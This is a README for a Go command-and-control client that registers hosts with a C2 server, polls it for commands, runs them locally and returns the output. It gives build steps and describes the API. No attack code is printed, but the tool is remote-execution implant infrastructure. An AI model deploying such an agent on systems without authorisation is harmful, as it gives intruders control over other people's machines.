# NeonC2 Client

Go-based client application for the NeonC2 command and control server.

## Features

- Automatic host registration with server
- Polls server for commands at regular intervals
- Executes commands locally and returns results
- Cross-platform support (Linux, Windows, macOS)
- Multiple architecture support (amd64, arm64, 386)

## Building

### Build for all platforms

```bash
chmod +x build.sh
./build.sh
```

This will create binaries in the `build/` directory for:
- Linux (amd64, arm64, 386)
- Windows (amd64, 386)
- macOS (amd64, arm64)

### Build for specific platform

```bash
# Linux
GOOS=linux GOARCH=amd64 go build -o neonc2-client-linux-amd64 main.go

# Windows
GOOS=windows GOARCH=amd64 go build -o neonc2-client-windows-amd64.exe main.go

# macOS
GOOS=darwin GOARCH=amd64 go build -o neonc2-client-darwin-amd64 main.go
```

## Usage

```bash
# Basic usage (uses default server URL: http://localhost:8080)
./neonc2-client-linux-amd64

# Specify server URL
./neonc2-client-linux-amd64 -server http://your-server.com:8080

# Specify hostname
./neonc2-client-linux-amd64 -hostname my-hostname

# Specify IP address (or use "auto" for auto-detection)
./neonc2-client-linux-amd64 -ip 192.168.1.100
```

## Command Line Flags

- `-server`: Server URL (default: http://localhost:8080)
- `-hostname`: Hostname to register with (default: system hostname)
- `-ip`: IP address to register with (default: "auto" for auto-detection)

## How It Works

1. **Registration**: On startup, the client registers itself with the server, providing:
   - Hostname
   - IP address
   - OS type and version
   - Architecture

2. **Polling**: The client polls the server every 5 seconds for pending commands

3. **Execution**: When a command is received:
   - Status is updated to "executing"
   - Command is executed locally
   - Results (stdout, stderr, exit code) are collected

4. **Result Submission**: Command results are sent back to the server in the next sync cycle

## API Endpoints Used

- `POST /api/hosts` - Register/update host
- `GET /api/hosts/{host_id}/commands` - Get pending commands
- `POST /api/hosts/{host_id}/commands/{command_id}/status` - Update command status
- `POST /api/hosts/{host_id}/commands/{command_id}/result` - Submit command result
